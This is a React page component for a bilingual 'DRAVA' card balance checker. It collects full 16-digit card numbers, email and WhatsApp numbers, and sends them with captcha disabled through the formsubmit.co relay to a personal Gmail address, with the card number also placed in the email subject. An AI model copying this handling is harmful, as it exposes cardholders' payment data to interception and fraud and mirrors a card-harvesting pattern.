"use client"

import React, { useState, useEffect, useRef } from 'react'
import MainLayout from '@/components/layout/MainLayout'
import { Button } from '@/components/ui/button'
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from '@/components/ui/card'
import { Input } from '@/components/ui/input'
import { Label } from '@/components/ui/label'
import { Info, CreditCard, ArrowRight, Check, XCircle, Loader2, Timer, Clock } from 'lucide-react'
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select'
import { useLanguage } from '@/lib/language-context'

// Constants
const FORMSUBMIT_EMAIL = 'contact.drava@gmail.com' // Adresse email pour FormSubmit
const COOLDOWN_DURATION = 20 * 60 * 1000; // 20 minutes en millisecondes
const COOLDOWN_KEY = 'drava_balance_cooldown';

// Translations
const getTranslations = (language) => ({
  pageTitle: language === 'fr'
    ? 'Vérifiez votre solde'
    : 'Check your balance',
  pageSubtitle: language === 'fr'
    ? 'Consultez le solde disponible sur votre carte DRAVA'
    : 'Check the available balance on your DRAVA card',
  cardTitle: language === 'fr'
    ? 'Vérification du solde'
    : 'Balance Check',
  cardDescription: language === 'fr'
    ? 'Remplissez le formulaire ci-dessous pour vérifier votre solde'
    : 'Fill out the form below to check your balance',
  nextCheckPossible: language === 'fr'
    ? 'Prochaine vérification possible dans:'
    : 'Next check possible in:',
  cardNumberLabel: language === 'fr'
    ? 'Numéro de carte (16 chiffres)'
    : 'Card number (16 digits)',
  cardNumberPlaceholder: language === 'fr'
    ? 'Entrez le numéro complet de votre carte'
    : 'Enter your complete card number',
  cardNumberError: language === 'fr'
    ? 'Veuillez entrer un numéro de carte valide (16 chiffres)'
    : 'Please enter a valid card number (16 digits)',
  emailLabel: language === 'fr'
    ? 'Adresse email'
    : 'Email address',
  emailPlaceholder: language === 'fr'
    ? 'Entrez votre adresse email'
    : 'Enter your email address',
  emailError: language === 'fr'
    ? 'Veuillez entrer une adresse email valide'
    : 'Please enter a valid email address',
  whatsAppNumberLabel: language === 'fr'
    ? 'Numéro WhatsApp (9 chiffres)'
    : 'WhatsApp number (9 digits)',
  whatsAppNumberPlaceholder: language === 'fr'
    ? 'Entrez votre numéro sans indicatif'
    : 'Enter your number without country code',
  whatsAppNumberError: language === 'fr'
    ? 'Veuillez entrer un numéro WhatsApp valide (9 chiffres)'
    : 'Please enter a valid WhatsApp number (9 digits)',
  cardTypeLabel: language === 'fr'
    ? 'Type de carte'
    : 'Card type',
  cardTypePlaceholder: language === 'fr'
    ? 'Sélectionnez le type de carte'
    : 'Select card type',
  cardTypeError: language === 'fr'
    ? 'Veuillez sélectionner un type de carte'
    : 'Please select a card type',
  submitButton: language === 'fr'
    ? 'Vérifier le solde'
    : 'Check balance',
  processingRequest: language === 'fr'
    ? 'Traitement en cours...'
    : 'Processing...',
  successTitle: language === 'fr'
    ? 'Demande envoyée avec succès!'
    : 'Request sent successfully!',
  successMessage: (email, indicatif, whatsappNumber) => language === 'fr'
    ? `Le solde de votre carte sera envoyé à ${email} et sur WhatsApp au ${indicatif}${whatsappNumber}.`
    : `Your card balance will be sent to ${email} and via WhatsApp to ${indicatif}${whatsappNumber}.`,
  reference: (reference) => language === 'fr'
    ? `Référence: ${reference}`
    : `Reference: ${reference}`,
  nextRequestIn: (remainingTime) => language === 'fr'
    ? `Vous pourrez faire une nouvelle demande dans: ${remainingTime}`
    : `You can make a new request in: ${remainingTime}`,
  errorTitle: language === 'fr'
    ? 'Erreur'
    : 'Error',
  errorMessage: language === 'fr'
    ? "Une erreur s'est produite lors de la soumission du formulaire. Veuillez réessayer."
    : "An error occurred while submitting the form. Please try again.",
  infoTitle: language === 'fr'
    ? 'Comment ça marche'
    : 'How it works',
  infoResponse: language === 'fr'
    ? 'Vous recevrez une réponse par email et WhatsApp dans les plus brefs délais.'
    : 'You will receive a response by email and WhatsApp as soon as possible.',
  infoCooldown: language === 'fr'
    ? 'Vous ne pouvez vérifier votre solde qu\'une fois toutes les 20 minutes.'
    : 'You can only check your balance once every 20 minutes.',
  infoFree: language === 'fr'
    ? 'Ce service est totalement gratuit.'
    : 'This service is completely free.',
  visaOption: language === 'fr'
    ? 'Carte Visa'
    : 'Visa Card',
  mastercardOption: language === 'fr'
    ? 'Carte Mastercard'
    : 'Mastercard Card',
  formSubmitError: language === 'fr'
    ? 'Erreur lors de la soumission du formulaire'
    : 'Error submitting form',
});

export default function BalancePage() {
  const { language } = useLanguage();
  const translations = getTranslations(language);

  const formSubmitRef = useRef(null); // Reference for FormSubmit

  // Form state
  const [cardNumber, setCardNumber] = useState('')
  const [email, setEmail] = useState('')
  const [whatsappNumber, setWhatsappNumber] = useState('')
  const [indicatif, setIndicatif] = useState('+237')
  const [cardType, setCardType] = useState('')

  // UI state
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [submitStatus, setSubmitStatus] = useState('') // '', 'success', 'error'
  const [errorMessage, setErrorMessage] = useState('')
  const [cooldownEnd, setCooldownEnd] = useState(0)
  const [remainingTime, setRemainingTime] = useState('')

  // Check for active cooldown on page load
  useEffect(() => {
    const checkCooldown = () => {
      try {
        const storedCooldown = localStorage.getItem(COOLDOWN_KEY);
        if (storedCooldown) {
          const cooldownEndTime = parseInt(storedCooldown, 10);
          const now = Date.now();

          if (now < cooldownEndTime) {
            setCooldownEnd(cooldownEndTime);
            updateRemainingTime(cooldownEndTime);
          } else {
            // Cooldown has expired
            localStorage.removeItem(COOLDOWN_KEY);
            setCooldownEnd(0);
            setRemainingTime('');
          }
        }
      } catch (error) {
        console.error('Error checking cooldown:', error);
      }
    };

    checkCooldown();
  }, []);

  // Set up timer to update remaining time
  useEffect(() => {
    if (cooldownEnd > 0) {
      const timerInterval = setInterval(() => {
        const now = Date.now();
        if (now >= cooldownEnd) {
          clearInterval(timerInterval);
          localStorage.removeItem(COOLDOWN_KEY);
          setCooldownEnd(0);
          setRemainingTime('');
        } else {
          updateRemainingTime(cooldownEnd);
        }
      }, 1000);

      return () => clearInterval(timerInterval);
    }
  }, [cooldownEnd]);

  // Helper to update the remaining time display
  const updateRemainingTime = (endTime) => {
    const now = Date.now();
    const diff = endTime - now;

    if (diff <= 0) {
      setRemainingTime('');
      return;
    }

    const minutes = Math.floor(diff / (60 * 1000));
    const seconds = Math.floor((diff % (60 * 1000)) / 1000);
    setRemainingTime(`${minutes}m ${seconds}s`);
  };

  // Set a new cooldown
  const setCooldown = () => {
    const now = Date.now();
    const endTime = now + COOLDOWN_DURATION;
    localStorage.setItem(COOLDOWN_KEY, endTime.toString());
    setCooldownEnd(endTime);
    updateRemainingTime(endTime);
  };

  // Validation functions
  const validateCardNumber = (value) => {
    return /^\d{16}$/.test(value);
  };

  const validateEmail = (value) => {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value);
  };

  const validateWhatsApp = (value) => {
    return /^\d{9}$/.test(value);
  };

  // Form submission handler
  const handleSubmit = async (e) => {
    e.preventDefault();

    // Validate form
    let hasError = false;
    let errors = {};

    if (!validateCardNumber(cardNumber)) {
      errors.cardNumber = translations.cardNumberError;
      hasError = true;
    }

    if (!validateEmail(email)) {
      errors.email = translations.emailError;
      hasError = true;
    }

    if (!validateWhatsApp(whatsappNumber)) {
      errors.whatsappNumber = translations.whatsAppNumberError;
      hasError = true;
    }

    if (!cardType) {
      errors.cardType = translations.cardTypeError;
      hasError = true;
    }

    if (hasError) {
      // Set errors and return
      Object.entries(errors).forEach(([field, message]) => {
        document.getElementById(`${field}-error`).textContent = message;
        document.getElementById(`${field}-error`).style.display = 'block';
      });
      return;
    }

    // Clear any previous errors
    ['cardNumber', 'email', 'whatsappNumber', 'cardType'].forEach(field => {
      document.getElementById(`${field}-error`).textContent = '';
      document.getElementById(`${field}-error`).style.display = 'none';
    });

    // Start submission
    setIsSubmitting(true);
    setSubmitStatus('');

    try {
      // Prepare form data
      const formData = new FormData();

      // Add required FormSubmit fields
      formData.append('_subject', `Vérification de solde DRAVA - ${cardNumber}`);
      formData.append('_template', 'table');
      formData.append('_captcha', 'false');
      formData.append('card_number', cardNumber);
      formData.append('email', email);
      formData.append('whatsapp_number', `${indicatif}${whatsappNumber}`);
      formData.append('card_type', cardType);
      formData.append('request_time', new Date().toISOString());

      // Send the form data using fetch
      const response = await fetch(`https://formsubmit.co/${FORMSUBMIT_EMAIL}`, {
        method: 'POST',
        body: formData,
      });

      // Handle response
      if (response.ok) {
        // Set cooldown
        setCooldown();

        // Show success message
        setSubmitStatus('success');

        // Reset form
        setCardNumber('');
        setEmail('');
        setWhatsappNumber('');
        setIndicatif('+237');
        setCardType('');
      } else {
        throw new Error(translations.formSubmitError);
      }
    } catch (error) {
      console.error('Error submitting form:', error);
      setSubmitStatus('error');
      setErrorMessage(translations.errorMessage);
    } finally {
      setIsSubmitting(false);
    }
  };

  // Is form disabled?
  const isFormDisabled = cooldownEnd > Date.now();

  return (
    <MainLayout>
      <section className="pt-20 md:pt-24 pb-16 bg-gradient-to-b from-blue-50 to-white">
        <div className="container mx-auto px-4">
          <div className="max-w-3xl mx-auto text-center mb-10">
            <h1 className="text-3xl md:text-5xl font-bold mb-4 text-gray-900">
              {translations.pageTitle.split(' ').slice(0, -1).join(' ')} <span className="bg-gradient-to-r from-blue-600 to-indigo-800 bg-clip-text text-transparent">{translations.pageTitle.split(' ').slice(-1)}</span>
            </h1>
            <p className="text-xl text-gray-600">
              {translations.pageSubtitle}
            </p>
          </div>

          <Card className="max-w-xl mx-auto border border-gray-100 shadow-lg">
            <CardHeader className="bg-gradient-to-r from-blue-500 to-blue-700 text-white rounded-t-lg">
              <div className="mx-auto mb-4">
                <CreditCard className="h-10 w-10" />
              </div>
              <CardTitle className="text-2xl text-center">{translations.cardTitle}</CardTitle>
              <CardDescription className="text-blue-100 text-center">
                {translations.cardDescription}
              </CardDescription>

              {isFormDisabled && (
                <div className="mt-4 py-2 px-4 bg-blue-600 rounded-md flex items-center justify-center">
                  <Timer className="h-5 w-5 mr-2 text-blue-200" />
                  <span className="text-sm font-medium">
                    {translations.nextCheckPossible} {remainingTime}
                  </span>
                </div>
              )}
            </CardHeader>
            <CardContent className="pt-6">
              {/* Status Messages */}
              {submitStatus === 'success' && (
                <div className="mb-6 bg-green-50 border border-green-200 rounded-lg p-4">
                  <div className="flex">
                    <Check className="h-5 w-5 text-green-500 mt-0.5 mr-3" />
                    <div>
                      <h4 className="font-medium text-green-800">{translations.successTitle}</h4>
                      <p className="text-sm text-green-700 mt-1">
                        {translations.successMessage(email, indicatif, whatsappNumber)}
                      </p>
                      <p className="text-xs text-green-600 mt-2">
                        {translations.reference(Date.now().toString().substring(5) + '-' + cardNumber)}
                      </p>
                      <div className="mt-3 pt-2 border-t border-green-200">
                        <p className="text-xs flex items-center mt-2 text-green-700">
                          <Clock className="h-4 w-4 mr-1" />
                          {translations.nextRequestIn(remainingTime)}
                        </p>
                      </div>
                    </div>
                  </div>
                </div>
              )}

              {submitStatus === 'error' && (
                <div className="mb-6 bg-red-50 border border-red-200 rounded-lg p-4">
                  <div className="flex">
                    <XCircle className="h-5 w-5 text-red-500 mt-0.5 mr-3" />
                    <div>
                      <h4 className="font-medium text-red-800">{translations.errorTitle}</h4>
                      <p className="text-sm text-red-700 mt-1">{errorMessage}</p>
                    </div>
                  </div>
                </div>
              )}

              {/* Balance Check Form */}
              <form onSubmit={handleSubmit}>
                <div className="space-y-4">
                  {/* Card Number */}
                  <div>
                    <Label htmlFor="cardNumber">{translations.cardNumberLabel}</Label>
                    <Input
                      id="cardNumber"
                      value={cardNumber}
                      onChange={(e) => {
                        // Only allow digits
                        const value = e.target.value.replace(/\D/g, '');
                        setCardNumber(value);
                        // Clear error on input
                        document.getElementById('cardNumber-error').style.display = 'none';
                      }}
                      placeholder={translations.cardNumberPlaceholder}
                      className="mt-1"
                      maxLength={16}
                      disabled={isFormDisabled || isSubmitting}
                      required
                    />
                    <p id="cardNumber-error" className="text-sm text-red-500 mt-1" style={{ display: 'none' }}></p>
                  </div>

                  {/* Email */}
                  <div>
                    <Label htmlFor="email">{translations.emailLabel}</Label>
                    <Input
                      id="email"
                      type="email"
                      value={email}
                      onChange={(e) => {
                        setEmail(e.target.value);
                        document.getElementById('email-error').style.display = 'none';
                      }}
                      placeholder={translations.emailPlaceholder}
                      className="mt-1"
                      disabled={isFormDisabled || isSubmitting}
                      required
                    />
                    <p id="email-error" className="text-sm text-red-500 mt-1" style={{ display: 'none' }}></p>
                  </div>

                  {/* WhatsApp Number */}
                  <div>
                    <Label htmlFor="whatsappNumber">{translations.whatsAppNumberLabel}</Label>
                    <div className="flex mt-1">
                      <Select
                        value={indicatif}
                        onValueChange={(value) => setIndicatif(value)}
                        disabled={isFormDisabled || isSubmitting}
                      >
                        <SelectTrigger className="w-24">
                          <SelectValue placeholder="+XXX" />
                        </SelectTrigger>
                        <SelectContent>
                          <SelectItem value="+237">+237</SelectItem>
                          <SelectItem value="+225">+225</SelectItem>
                          <SelectItem value="+221">+221</SelectItem>
                          <SelectItem value="+241">+241</SelectItem>
                          <SelectItem value="+242">+242</SelectItem>
                          <SelectItem value="+243">+243</SelectItem>
                        </SelectContent>
                      </Select>
                      <Input
                        id="whatsappNumber"
                        className="flex-1 ml-2"
                        value={whatsappNumber}
                        onChange={(e) => {
                          // Only allow digits
                          const value = e.target.value.replace(/\D/g, '');
                          setWhatsappNumber(value);
                          document.getElementById('whatsappNumber-error').style.display = 'none';
                        }}
                        placeholder={translations.whatsAppNumberPlaceholder}
                        maxLength={9}
                        disabled={isFormDisabled || isSubmitting}
                        required
                      />
                    </div>
                    <p id="whatsappNumber-error" className="text-sm text-red-500 mt-1" style={{ display: 'none' }}></p>
                  </div>

                  {/* Card Type */}
                  <div>
                    <Label htmlFor="cardType">{translations.cardTypeLabel}</Label>
                    <Select
                      value={cardType}
                      onValueChange={(value) => {
                        setCardType(value);
                        document.getElementById('cardType-error').style.display = 'none';
                      }}
                      disabled={isFormDisabled || isSubmitting}
                    >
                      <SelectTrigger id="cardType" className="mt-1">
                        <SelectValue placeholder={translations.cardTypePlaceholder} />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="visa">{translations.visaOption}</SelectItem>
                        <SelectItem value="mastercard">{translations.mastercardOption}</SelectItem>
                      </SelectContent>
                    </Select>
                    <p id="cardType-error" className="text-sm text-red-500 mt-1" style={{ display: 'none' }}></p>
                  </div>

                  {/* Information Box */}
                  <div className="mt-6 bg-blue-50 border border-blue-100 rounded-lg p-4">
                    <div className="flex">
                      <Info className="h-5 w-5 text-blue-500 mt-0.5 mr-3 flex-shrink-0" />
                      <div>
                        <h4 className="font-medium text-blue-800">{translations.infoTitle}</h4>
                        <ul className="text-sm text-blue-700 mt-2 space-y-1 list-disc list-inside">
                          <li>{translations.infoResponse}</li>
                          <li>{translations.infoCooldown}</li>
                          <li>{translations.infoFree}</li>
                        </ul>
                      </div>
                    </div>
                  </div>

                  <div className="mt-6">
                    <Button
                      type="submit"
                      className="w-full bg-gradient-to-r from-blue-600 to-indigo-800"
                      disabled={isFormDisabled || isSubmitting}
                    >
                      {isSubmitting ? (
                        <>
                          <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                          {translations.processingRequest}
                        </>
                      ) : (
                        translations.submitButton
                      )}
                    </Button>
                  </div>
                </div>
              </form>
            </CardContent>
          </Card>
        </div>
      </section>
    </MainLayout>
  )
}
